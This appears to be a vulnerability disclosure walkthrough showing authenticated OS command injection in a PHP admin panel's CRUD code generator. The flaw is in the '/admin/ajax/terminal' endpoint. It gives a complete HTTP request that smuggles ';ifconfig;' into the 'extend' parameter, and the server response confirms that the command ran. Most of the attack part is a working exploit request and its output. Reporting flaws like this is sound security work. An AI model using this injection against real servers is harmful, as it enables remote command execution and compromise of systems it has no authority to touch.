1. Access the administrative backend and authenticate using valid administrator credentials.

![image-20251226203154861](D:\image\image-20251226203154861.png)

2.  After successful authentication, navigate to the backend dashboard to confirm normal access.

![image-20251226203238667](D:\image\image-20251226203238667.png)

3. Select the **CRUD Code Generation** feature from the backend management interface.

![image-20251226203622229](D:\image\image-20251226203622229.png)

4. Create a new backend CRUD configuration:
   - Specify arbitrary values for the **database table name** and **table description**.
   - Select **Primary Key** from the common fields section and move it to the selected fields panel.
   - Choose any required basic fields and move them to the selected fields panel accordingly.

![image-20251226212436404](D:\image\image-20251226212436404.png)

5. Click **Generate CRUD Code**.
    While generating the code, intercept the request using Burp Suite and identify the vulnerable endpoint:`/admin/ajax/terminal`

   Capture the corresponding HTTP request body.

![image-20251226212539917](D:\image\image-20251226212539917.png)

6. Modify the intercepted request by injecting a malicious payload into the vulnerable parameter to trigger OS command execution.
    For example, attempting to execute the `ifconfig` command successfully returns the server’s network interface and IP address information, confirming remote command execution.

![image-20251226212806310](D:\image\image-20251226212806310.png)

request：

```http
GET /admin/ajax/terminal?command=npx.prettier&uuid=34f8040f-8de8-4e3a-ab79-caf82f6d99a2&extend=./src/views/backend/hello;ifconfig;&batoken=8d4d1639-ecb7-4680-a7e4-02956c9620b6&server=1 HTTP/1.1
Host: 192.168.239.136:8000
Cache-Control: no-cache
Accept-Language: zh-CN,zh;q=0.9
Accept: text/event-stream
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Referer: http://192.168.239.136:8000/index.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```

response：

```http
HTTP/1.1 200 OK
Host: 192.168.239.136:8000
Date: Fri, 26 Dec 2025 13:26:30 GMT
Connection: close
X-Powered-By: PHP/8.3.27
Access-Control-Allow-Credentials:true
Access-Control-Max-Age:1800
Access-Control-Allow-Methods:*
Access-Control-Allow-Headers:*
X-Accel-Buffering:no
Content-type: text/event-stream;charset=UTF-8
Cache-Control:no-cache

data: {"data":"command-link-success","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

data: {"data":"> 开始格式化前端代码（失败无影响，代码编辑器内按需的手动格式化即可）","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

data: {"data":"> npx prettier --write .\/src\/views\/backend\/hello;ifconfig;","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

data: {"data":"npm warn Unknown project config \"shamefully-hoist\". This will stop working in the next major version of npm.","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

data: {"data":"src\/views\/backend\/hello\/index.vue 197ms (unchanged)\nsrc\/views\/backend\/hello\/popupForm.vue 100ms (unchanged)\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.239.136  netmask 255.255.255.0  broadcast 192.168.239.255\n        inet6 fe80::20c:29ff:fe53:67d  prefixlen 64  scopeid 0x20<link>\n        ether 00:0c:29:53:06:7d  txqueuelen 1000  (Ethernet)\n        RX packets 244678  bytes 304052851 (289.9 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 75127  bytes 48214300 (45.9 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 5735  bytes 1516002 (1.4 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 5735  bytes 1516002 (1.4 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

data: {"data":"exitCode: 0","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

data: {"data":"command-exec-success","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

data: {"data":"command-exec-completed","uuid":"34f8040f-8de8-4e3a-ab79-caf82f6d99a2","extend":".\/src\/views\/backend\/hello;ifconfig;","key":"npx.prettier"}

```